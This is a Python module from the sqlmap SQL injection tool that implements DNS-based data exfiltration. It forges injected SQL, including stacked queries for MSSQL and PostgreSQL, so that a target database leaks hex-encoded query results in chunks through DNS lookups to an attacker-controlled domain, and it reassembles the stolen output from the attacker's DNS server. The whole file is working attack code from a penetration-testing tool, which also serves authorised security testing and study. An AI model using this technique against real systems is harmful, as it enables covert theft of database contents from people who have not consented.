#!/usr/bin/env python

"""
Copyright (c) 2006-2013 sqlmap developers (http://sqlmap.org/)
See the file 'doc/COPYING' for copying permission
"""

import re
import time

from extra.safe2bin.safe2bin import safecharencode
from lib.core.agent import agent
from lib.core.common import Backend
from lib.core.common import calculateDeltaSeconds
from lib.core.common import dataToStdout
from lib.core.common import decodeHexValue
from lib.core.common import extractRegexResult
from lib.core.common import getSQLSnippet
from lib.core.common import hashDBRetrieve
from lib.core.common import hashDBWrite
from lib.core.common import randomInt
from lib.core.common import randomStr
from lib.core.common import safeStringFormat
from lib.core.common import singleTimeWarnMessage
from lib.core.data import conf
from lib.core.data import kb
from lib.core.data import logger
from lib.core.data import queries
from lib.core.enums import DBMS
from lib.core.settings import DNS_BOUNDARIES_ALPHABET
from lib.core.settings import MAX_DNS_LABEL
from lib.core.settings import PARTIAL_VALUE_MARKER
from lib.core.unescaper import unescaper
from lib.request.connect import Connect as Request


def dnsUse(payload, expression):
    """
    Retrieve the output of a SQL query taking advantage of the DNS
    resolution mechanism by making request back to attacker's machine.
    """

    start = time.time()

    retVal = None
    count = 0
    offset = 1

    if conf.dnsName and Backend.getIdentifiedDbms() in (DBMS.MSSQL, DBMS.ORACLE, DBMS.MYSQL, DBMS.PGSQL):
        output = hashDBRetrieve(expression, checkConf=True)

        if output and PARTIAL_VALUE_MARKER in output or kb.dnsTest is None:
            output = None

        if output is None:
            kb.dnsMode = True

            while True:
                count += 1
                prefix, suffix = ("%s" % randomStr(length=3, alphabet=DNS_BOUNDARIES_ALPHABET) for _ in xrange(2))
                chunk_length = MAX_DNS_LABEL / 2 if Backend.getIdentifiedDbms() in (DBMS.ORACLE, DBMS.MYSQL, DBMS.PGSQL) else MAX_DNS_LABEL / 4 - 2
                _, _, _, _, _, _, fieldToCastStr, _ = agent.getFields(expression)
                nulledCastedField = agent.nullAndCastField(fieldToCastStr)
                nulledCastedField = queries[Backend.getIdentifiedDbms()].substring.query % (nulledCastedField, offset, chunk_length)
                nulledCastedField = agent.hexConvertField(nulledCastedField)
                expressionReplaced = expression.replace(fieldToCastStr, nulledCastedField, 1)

                expressionRequest = getSQLSnippet(Backend.getIdentifiedDbms(), "dns_request", PREFIX=prefix, QUERY=expressionReplaced, SUFFIX=suffix, DOMAIN=conf.dnsName)
                expressionUnescaped = unescaper.escape(expressionRequest)

                if Backend.getIdentifiedDbms() in (DBMS.MSSQL, DBMS.PGSQL):
                    query = agent.prefixQuery("; %s" % expressionUnescaped)
                    query = agent.suffixQuery(query)
                    forgedPayload = agent.payload(newValue=query)
                else:
                    forgedPayload = safeStringFormat(payload, (expressionUnescaped, randomInt(1), randomInt(3)))

                Request.queryPage(forgedPayload, content=False, noteResponseTime=False, raise404=False)

                _ = conf.dnsServer.pop(prefix, suffix)

                if _:
                    _ = extractRegexResult("%s\.(?P<result>.+)\.%s" % (prefix, suffix), _, re.I)
                    _ = decodeHexValue(_)
                    output = (output or "") + _
                    offset += len(_)

                    if len(_) < chunk_length:
                        break
                else:
                    break

            kb.dnsMode = False

        if output is not None:
            retVal = output

            if kb.dnsTest is not None:
                dataToStdout("[%s] [INFO] %s: %s\r\n" % (time.strftime("%X"), "retrieved" if count > 0 else "resumed", safecharencode(output)))

                if count > 0:
                    hashDBWrite(expression, output)

        if not kb.bruteMode:
            debugMsg = "performed %d queries in %.2f seconds" % (count, calculateDeltaSeconds(start))
            logger.debug(debugMsg)

    elif conf.dnsName:
        warnMsg = "DNS data exfiltration method through SQL injection "
        warnMsg += "is currently not available for DBMS %s" % Backend.getIdentifiedDbms()
        singleTimeWarnMessage(warnMsg)

    return safecharencode(retVal) if kb.safeCharEncode else retVal
